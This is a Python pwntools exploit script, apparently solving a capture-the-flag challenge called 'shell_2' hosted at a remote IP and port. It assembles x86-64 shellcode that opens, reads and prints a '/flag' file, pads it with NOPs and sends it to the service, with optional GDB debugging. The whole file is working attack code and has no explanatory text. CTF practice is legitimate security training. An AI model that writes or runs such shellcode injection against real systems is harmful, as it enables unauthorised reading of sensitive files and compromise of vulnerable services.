#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'shell_2'
HOST = '103.77.175.40'
PORT = 6072

exe = ELF(exe_path, checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
break *main+149
b*main+195
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

# add payload, script here
shellcode = asm('''
xor rax, rax 
push rax
mov rbx, 0x67616c662f
push rbx
mov rdi, rsp
xor rsi, rsi
mov rax, 2
syscall


mov rdi, rax
mov rsi, rsp
mov rdx, 100
xor rax, rax
syscall


mov rdi, 1
mov rdx, rax
mov rsi, rsp
mov rax, 1
syscall


xor rdi, rdi
mov rax, 60
syscall
''')

payload = shellcode.ljust(0x1000, b'\x90')
p.sendlineafter(b'Enter your shellcode (max 4096 bytes):\n', payload)

p.interactive()
